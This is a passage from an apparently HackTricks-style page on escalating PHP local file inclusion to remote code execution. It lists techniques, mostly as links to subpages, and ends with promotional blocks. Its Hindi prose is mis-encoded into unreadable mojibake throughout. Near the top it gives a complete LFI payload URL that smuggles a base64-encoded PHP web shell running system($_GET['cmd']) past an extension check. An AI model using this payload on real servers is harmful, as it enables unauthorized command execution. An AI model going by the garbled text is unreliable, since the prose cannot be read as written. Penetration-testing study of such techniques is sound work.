[рдЗрд╕](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) рд▓реЗрдЦ рдореЗрдВ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ PHP base64 рдлрд╝рд┐рд▓реНрдЯрд░ рдХреЗрд╡рд▓ рдЧреИрд░-рдмреЗрд╕64 рдХреЛ рдирдЬрд░рдЕрдВрджрд╛рдЬ рдХрд░рддрд╛ рд╣реИред рдЖрдк рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдлрд╝рд╛рдЗрд▓ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдЬрд╛рдВрдЪ рдХреЛ рдЙрдореНрдореАрджрд╡рд╛рд░ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: рдпрджрд┐ рдЖрдк рдмреЗрд╕64 рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВ рдЬреЛ ".php" рдХреЗ рд╕рд╛рде рд╕рдорд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ, рдФрд░ рдпрд╣ рдмрд╕ "." рдХреЛ рдирдЬрд░рдЕрдВрджрд╛рдЬ рдХрд░реЗрдЧрд╛ рдФрд░ "php" рдХреЛ рдмреЗрд╕64 рдореЗрдВ рдЬреЛрдбрд╝ рджреЗрдЧрд╛ред рдпрд╣рд╛рдБ рдПрдХ рдЙрджрд╛рд╣рд░рдг рдкреЗрд▓реЛрдб рд╣реИ:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### PHP рдлрд╝рд┐рд▓реНрдЯрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ (рдХреЛрдИ рдлрд╝рд╛рдЗрд▓ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ)

рдЗрд╕ [**writeup**](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) рдореЗрдВ рд╡рд┐рд╡рд░рдг рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рдЖрдк **php рдлрд╝рд┐рд▓реНрдЯрд░ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ** рд╡рд┐рднрд╛рдЬрди рдХреЗ рд▓рд┐рдП **рдЕрдирд┐рдпрдорд┐рдд рд╕рд╛рдордЧреНрд░реА рдЙрддреНрдкрдиреНрди** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЬрд┐рд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЖрдк **рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд▓рд┐рдЦрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ** рд╣реИ, рдЖрдк **рд╕рдореНрдорд┐рд▓рд┐рдд рдХреЗ рд▓рд┐рдП рдЕрдирд┐рдпрдорд┐рдд php рдХреЛрдб** рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

{% content-ref url="lfi2rce-via-php-filters.md" %}
[lfi2rce-via-php-filters.md](lfi2rce-via-php-filters.md)
{% endcontent-ref %}

### рд╕реЗрдЧрдореЗрдВрдЯреЗрд╢рди рдлреЙрд▓реНрдЯ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

**рдПрдХ рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб** рдХрд░реЗрдВ рдЬреЛ `/tmp` рдореЗрдВ **рдЕрд╕реНрдерд╛рдпреА рд░реВрдк рд╕реЗ** рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реЛрдЧреА, рдлрд┐рд░ **рдПрдХ рд╣реА рдЕрдиреБрд░реЛрдз рдореЗрдВ,** рдПрдХ **рд╕реЗрдЧрдореЗрдВрдЯреЗрд╢рди рдлреЙрд▓реНрдЯ** рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдВ, рдФрд░ рдлрд┐рд░ **рдЕрд╕реНрдерд╛рдпреА рдлрд╝рд╛рдЗрд▓ рдорд┐рдЯрд╛рдИ рдирд╣реАрдВ рдЬрд╛рдПрдЧреА** рдФрд░ рдЖрдк рдЗрд╕реЗ рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВред

{% content-ref url="lfi2rce-via-segmentation-fault.md" %}
[lfi2rce-via-segmentation-fault.md](lfi2rce-via-segmentation-fault.md)
{% endcontent-ref %}

### Nginx рдЕрд╕реНрдерд╛рдпреА рдлрд╝рд╛рдЗрд▓ рд╕рдВрдЧреНрд░рд╣рдг

рдпрджрд┐ рдЖрдкрдиреЗ **рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рд╕рдорд╛рд╡реЗрд╢рди** рдкрд╛рдпрд╛ рд╣реИ рдФрд░ **Nginx** PHP рдХреЗ рд╕рд╛рдордиреЗ рдЪрд▓ рд░рд╣рд╛ рд╣реИ рддреЛ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рддрдХрдиреАрдХ рдХреЗ рд╕рд╛рде RCE рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="lfi2rce-via-nginx-temp-files.md" %}
[lfi2rce-via-nginx-temp-files.md](lfi2rce-via-nginx-temp-files.md)
{% endcontent-ref %}

### PHP\_SESSION\_UPLOAD\_PROGRESS рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдпрджрд┐ рдЖрдкрдиреЗ **рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рд╕рдорд╛рд╡реЗрд╢рди** рдкрд╛рдпрд╛ рд╣реИ рднрд▓реЗ рд╣реА рдЖрдкрдХреЗ рдкрд╛рд╕ **рдПрдХ рд╕рддреНрд░ рди рд╣реЛ** рдФрд░ `session.auto_start` `Off` рд╣реИред рдпрджрд┐ рдЖрдк **рдорд▓реНрдЯреАрдкрд╛рд░реНрдЯ POST** рдбреЗрдЯрд╛ рдореЗрдВ **`PHP_SESSION_UPLOAD_PROGRESS`** рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВ, рддреЛ PHP **рдЖрдкрдХреЗ рд▓рд┐рдП рд╕рддреНрд░ рд╕рдХреНрд╖рдо рдХрд░ рджреЗрдЧрд╛**ред рдЖрдк рдЗрд╕рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="via-php_session_upload_progress.md" %}
[via-php\_session\_upload\_progress.md](via-php\_session\_upload\_progress.md)
{% endcontent-ref %}

### Windows рдореЗрдВ рдЕрд╕реНрдерд╛рдпреА рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдпрджрд┐ рдЖрдкрдиреЗ **рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рд╕рдорд╛рд╡реЗрд╢рди** рдкрд╛рдпрд╛ рд╣реИ рдФрд░ рд╕рд░реНрд╡рд░ **Windows** рдореЗрдВ рдЪрд▓ рд░рд╣рд╛ рд╣реИ рддреЛ рдЖрдк RCE рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="lfi2rce-via-temp-file-uploads.md" %}
[lfi2rce-via-temp-file-uploads.md](lfi2rce-via-temp-file-uploads.md)
{% endcontent-ref %}

### phpinfo() рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ (file\_uploads = on)

рдпрджрд┐ рдЖрдкрдиреЗ **рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рд╕рдорд╛рд╡реЗрд╢рди** рдкрд╛рдпрд╛ рд╣реИ рдФрд░ рдПрдХ рдлрд╝рд╛рдЗрд▓ **phpinfo()** рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░ рд░рд╣реА рд╣реИ рдЬрд┐рд╕рдореЗрдВ file\_uploads = on рд╣реИ, рддреЛ рдЖрдк RCE рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="lfi2rce-via-phpinfo.md" %}
[lfi2rce-via-phpinfo.md](lfi2rce-via-phpinfo.md)
{% endcontent-ref %}

### compress.zlib + `PHP_STREAM_PREFER_STUDIO` + рдкрде рд╡рд┐рд╡рд░рдг

рдпрджрд┐ рдЖрдкрдиреЗ **рд╕реНрдерд╛рдиреАрдп рдлрд╝рд╛рдЗрд▓ рд╕рдорд╛рд╡реЗрд╢рди** рдкрд╛рдпрд╛ рд╣реИ рдФрд░ рдЖрдк **рдЕрд╕реНрдерд╛рдпреА рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдкрде рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ** рд▓реЗрдХрд┐рди **рд╕рд░реНрд╡рд░** рдпрд╣ **рдЬрд╛рдВрдЪ рд░рд╣рд╛ рд╣реИ** рдХрд┐ **рд╕рдореНрдорд┐рд▓рд┐рдд рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рдлрд╝рд╛рдЗрд▓ рдореЗрдВ PHP рдорд╛рд░реНрдХреНрд╕ рд╣реИрдВ** рддреЛ рдЖрдк рдЗрд╕ **Race Condition** рдХреЗ рд╕рд╛рде рдЙрд╕ рдЬрд╛рдВрдЪ рдХреЛ **рдЫрд▓рдирд╛** рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.md" %}
[lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md](lfi2rce-via-compress.zlib-+-php\_stream\_prefer\_studio-+-path-disclosure.md)
{% endcontent-ref %}

### рдЕрдирдВрдд рдкреНрд░рддреАрдХреНрд╖рд╛ + рдмреНрд░реВрдЯрдлрд╝реЛрд░реНрд╕ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ

рдпрджрд┐ рдЖрдк LFI рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ **рдЕрд╕реНрдерд╛рдпреА рдлрд╝рд╛рдЗрд▓реЗрдВ рдЕрдкрд▓реЛрдб** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╕рд░реНрд╡рд░ рдХреЛ **PHP рдХреНрд░рд┐рдпрд╛рдиреНрд╡рдпрди рдореЗрдВ рдлрдВрд╕рд╛** рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдлрд┐рд░ **рдШрдВрдЯреЛрдВ рддрдХ рдЕрд╕реНрдерд╛рдпреА рдлрд╝рд╛рдЗрд▓реЗрдВ рдЦреЛрдЬрдиреЗ рдХреЗ рд▓рд┐рдП рдлрд╝рд╛рдЗрд▓ рдирд╛рдореЛрдВ рдХрд╛ рдмреНрд░реВрдЯрдлрд╝реЛрд░реНрд╕** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% content-ref url="lfi2rce-via-eternal-waiting.md" %}
[lfi2rce-via-eternal-waiting.md](lfi2rce-via-eternal-waiting.md)
{% endcontent-ref %}

### рдлреЗрдЯрд▓ рддреНрд░реБрдЯрд┐ рдХреЗ рд▓рд┐рдП

рдпрджрд┐ рдЖрдк **`/usr/bin/phar`, `/usr/bin/phar7`, `/usr/bin/phar.phar7`, `/usr/bin/phar.phar`** рдореЗрдВ рд╕реЗ рдХрд┐рд╕реА рднреА рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╕рдореНрдорд┐рд▓рд┐рдд рдХрд░рддреЗ рд╣реИрдВред (рдЖрдкрдХреЛ рдЙрд╕реА рдХреЛ 2 рдмрд╛рд░ рд╕рдореНрдорд┐рд▓рд┐рдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЙрд╕ рддреНрд░реБрдЯрд┐ рдХреЛ рдлреЗрдВрдХ рд╕рдХреЗрдВ)ред

**рдореБрдЭреЗ рдирд╣реАрдВ рдкрддрд╛ рдХрд┐ рдпрд╣ рдХрд┐рддрдирд╛ рдЙрдкрдпреЛрдЧреА рд╣реИ рд▓реЗрдХрд┐рди рдпрд╣ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред**\
_рдпрджрд┐ рдЖрдк PHP рдлреЗрдЯрд▓ рддреНрд░реБрдЯрд┐ рдХрд╛ рдХрд╛рд░рдг рдмрдирд╛рддреЗ рд╣реИрдВ, рддреЛ PHP рдЕрд╕реНрдерд╛рдпреА рд░реВрдк рд╕реЗ рдЕрдкрд▓реЛрдб рдХреА рдЧрдИ рдлрд╝рд╛рдЗрд▓реЗрдВ рд╣рдЯрд╛ рджреА рдЬрд╛рддреА рд╣реИрдВред_

<figure><img src="../../.gitbook/assets/image (1031).png" alt=""><figcaption></figcaption></figure>

## рд╕рдВрджрд░реНрдн

* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal)\\
* [PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion%20-%20Path%20Traversal/Intruders)

{% file src="../../.gitbook/assets/EN-Local-File-Inclusion-1.pdf" %}

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) рд╕рд░реНрд╡рд░ рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдХрд░ рдЕрдиреБрднрд╡реА рд╣реИрдХрд░реНрд╕ рдФрд░ рдмрдЧ рдмрд╛рдЙрдВрдЯреА рд╣рдВрдЯрд░реНрд╕ рдХреЗ рд╕рд╛рде рд╕рдВрд╡рд╛рдж рдХрд░реЗрдВ!

**рд╣реИрдХрд┐рдВрдЧ рдЗрдВрд╕рд╛рдЗрдЯреНрд╕**\
рд╣реИрдХрд┐рдВрдЧ рдХреЗ рд░реЛрдорд╛рдВрдЪ рдФрд░ рдЪреБрдиреМрддрд┐рдпреЛрдВ рдореЗрдВ рдбреВрдмрдиреЗ рд╡рд╛рд▓реА рд╕рд╛рдордЧреНрд░реА рдХреЗ рд╕рд╛рде рдЬреБрдбрд╝реЗрдВ

**рд░рд┐рдпрд▓-рдЯрд╛рдЗрдо рд╣реИрдХ рд╕рдорд╛рдЪрд╛рд░**\
рд░рд┐рдпрд▓-рдЯрд╛рдЗрдо рд╕рдорд╛рдЪрд╛рд░ рдФрд░ рдЕрдВрддрд░реНрджреГрд╖реНрдЯрд┐ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рддреЗрдЬрд╝ рдЧрддрд┐ рд╕реЗ рдмрджрд▓рддреА рд╣реИрдХрд┐рдВрдЧ рджреБрдирд┐рдпрд╛ рдХреЗ рд╕рд╛рде рдЕрдк-рдЯреВ-рдбреЗрдЯ рд░рд╣реЗрдВ

**рдирд╡реАрдирддрдо рдШреЛрд╖рдгрд╛рдПрдВ**\
рдирд╡реАрдирддрдо рдмрдЧ рдмрд╛рдЙрдВрдЯреА рд▓реЙрдиреНрдЪ рдФрд░ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рдЕрдкрдбреЗрдЯ рдХреЗ рд╕рд╛рде рд╕реВрдЪрд┐рдд рд░рд╣реЗрдВ

**рд╣рдорд╛рд░реЗ рд╕рд╛рде рдЬреБрдбрд╝реЗрдВ** [**Discord**](https://discord.com/invite/N3FrSbmwdy) рдФрд░ рдЖрдЬ рд╣реА рд╢реАрд░реНрд╖ рд╣реИрдХрд░реНрд╕ рдХреЗ рд╕рд╛рде рд╕рд╣рдпреЛрдЧ рдХрд░рдирд╛ рд╢реБрд░реВ рдХрд░реЗрдВ!

<details>

<summary><strong>рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВ **PR рдЬрдорд╛ рдХрд░рдХреЗ** рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>
